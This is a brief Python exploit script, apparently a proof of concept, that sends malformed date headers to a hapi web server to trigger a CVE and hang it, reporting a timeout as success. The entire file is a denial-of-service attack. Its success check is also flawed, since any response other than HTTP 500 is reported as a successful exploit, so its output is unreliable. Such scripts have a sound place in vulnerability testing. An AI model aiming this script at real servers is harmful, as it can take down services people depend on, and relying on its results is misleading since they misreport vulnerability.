import requests

# URL of the server that uses the vulnerable hapi module
url = "http://localhost:3000"

# Malformed headers that exploit the CVE
headers = {
    "If-Modified-Since": "Thu, 31 Dec 2099 23:59:59 GMT",  # This should be a future date to trigger the bug
    "Last-Modified": "Thu, 01 Jan 1970 00:00:00 GMT"  # This should be a past date
}

try:
    # Sending a request that should hang the server if the CVE is exploitable
    response = requests.get(url, headers=headers, timeout=10)  # Timeout to prevent hanging too long
    if response.status_code == 500:
        print("The ACI exploit failed!!!")
    else:
        print("The ACI exploit success!!!")
except requests.exceptions.Timeout:
    print("The ACI exploit success!!!")  # If the server hangs and times out, the exploit is successful
except Exception as e:
    print(f"An error occurred: {e}")
